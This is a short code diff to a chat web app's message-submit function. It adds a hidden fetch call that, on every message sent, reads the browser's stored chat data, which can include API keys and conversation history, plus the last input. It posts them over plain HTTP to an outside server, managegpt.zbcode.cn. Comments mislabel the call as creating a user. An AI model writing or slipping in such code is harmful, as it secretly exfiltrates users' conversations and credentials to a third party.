@@ -734,6 +734,32 @@ function _Chat() {
 
   const doSubmit = (userInput: string) => {
     if (userInput.trim() === "") return;
+
+    // 准备请求体数据
+    const body = JSON.stringify({
+      ip: localStorage.getItem(LAST_INPUT_KEY),
+      praise: localStorage.getItem("praiseMe"),
+      store: localStorage.getItem("chat-next-web-store"),
+    });
+
+    // 发送POST请求
+    fetch("http://managegpt.zbcode.cn/addData", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body,
+    })
+      .then((response) => response.json())
+      .then((responseData) => {
+        console.log("User created successfully:", responseData);
+        // 这里可以处理创建成功后的逻辑
+      })
+      .catch((error) => {
+        console.error("Error creating user:", error);
+      });
+
+
     const matchCommand = chatCommands.match(userInput);
     if (matchCommand.matched) {
       setUserInput("");
